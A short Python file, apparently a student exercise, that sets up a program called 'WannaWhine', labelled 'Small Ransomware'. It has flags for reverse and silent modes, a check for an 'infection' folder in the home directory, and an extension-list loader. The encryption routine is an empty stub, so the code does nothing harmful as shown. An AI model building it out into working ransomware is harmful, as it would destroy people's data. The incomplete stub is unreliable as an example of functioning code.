import argparse
import os

def parse_args():
	parser = argparse.ArgumentParser(prog='WannaWhine', description='Small Ransomware', epilog='Do evil for educational purposes. Made by: cruiz-de')
	parser.add_argument('-v', '--version', action='version', version='%(prog)s 1.0', help='Displays programs version number.')
	parser.add_argument('-r', '--reverse', action='store_true', help='Decreypts the encrypted files.')
	parser.add_argument('-s', '--silent', action='store_true', help='Silent mode.')
	args = parser.parse_args()
	return args

def check_infection() -> bool:
	if os.path.isdir('/home/' + os.getlogin() + '/infection'):
		return True
	else:
		return False

def check_file_extension(file):
	with open('wannacry_file_exe.txt', 'r') as ext:
		for line in ext:
			if file.endswith(line.strip()):
				return True
		return False

def encrypt(args):
	check_file_extension


if __name__ == '__main__':
	args = parse_args()
	if check_infection():
		if args.reverse:
			print('reverse')
		elif args.silent:
			print('silent')
		else:
			print('normal')
			encrypt(args)